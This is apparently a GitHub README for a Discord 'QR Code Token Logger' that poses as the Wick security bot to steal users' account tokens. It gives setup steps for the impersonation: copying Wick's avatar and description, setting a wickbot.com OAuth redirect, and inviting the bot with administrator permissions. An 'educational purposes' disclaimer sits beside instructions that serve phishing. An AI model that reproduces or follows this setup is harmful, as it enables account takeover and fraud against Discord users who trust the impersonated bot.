<h1 align="center">Discord QR Code Token Logger</h1>
<h3 align="center">Discord Bot that impersonates Wick Bot to steal tokens!</h3>

## Features
- **Looks exactly like Wick Bot.** (when configured properly)
- **Memory Efficient.** (doesn't use chromedriver.exe or any browser)
- **Very stable and reliable.** (minimal crashes and bugs)

## Disclaimers
- This is a bot that is not affiliated with any of the Discord or Discord Inc. teams.
- This was made for educational purposes. It is not meant to be used for malicious purposes.
- Any use of this bot is at your own risk. I am not responsible for any damage that may occur.

## Setup
- **Clone the repository and install dependancies** 
    - ```gh repo clone ulnk/scam```
    - ```npm install``` or ```yarn```
- **Create a new Discord Bot**
    - Enable all intents for the bot
    - Add ```https://wickbot.com/wauth/callback``` to the redirect urls in the OAuth2 section of the bot's settings.
    - Change bot's profile picture to [wick.png](https://github.com/ulnk/scam/blob/main/wick.png).
    - Change bot's description to 
        - ```Discord Security Bot made to protect servers from raids, nukes and more things! https://wickbot.com/ ```
    - Use this url to invite bot (change client_id to your bot's client id): 
        - ```https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&redirect_uri=https%3A%2F%2Fwickbot.com%2Fwauth%2Fcallback&response_type=code&scope=applications.commands%20bot%20messages.read```
- **Edit config-default.json**
    - Rename it to ``config.json``
- **Add emojis to a discord server**
    - It is recommended to place emojis in a seperate server.
    - You can select all and drag into emojis section in server settings to quickly add all.
    - THe bot will automatically find the emojis no need to get all ids. (do not change the name of the emojis)
- **Start the bot**
    - ```npm run start``` or ```yarn start```

### Libraries Used
* **discord.js** (discord bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
* **crypto** (private keys & public keys) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
* **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
* **jimp** (image editing for qr code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">